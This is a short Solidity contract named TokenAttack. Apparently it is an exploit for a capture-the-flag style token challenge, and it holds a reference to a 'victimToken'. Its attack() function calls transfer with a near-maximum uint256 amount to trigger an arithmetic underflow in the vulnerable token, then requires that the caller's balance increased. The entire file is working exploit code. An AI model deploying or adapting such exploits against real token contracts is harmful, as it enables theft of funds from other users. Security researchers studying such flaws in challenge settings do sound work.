// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IToken.sol";

contract TokenAttack {
    IToken private immutable victimToken;

    constructor(IToken victimToken_) {
        victimToken = victimToken_;
    }

    function attack() external {
        uint256 balance = victimToken.balanceOf(msg.sender);

        victimToken.transfer(msg.sender, type(uint256).max - balance - 1);

        require(balance < victimToken.balanceOf(msg.sender), "Token: Attack failed");
    }
}
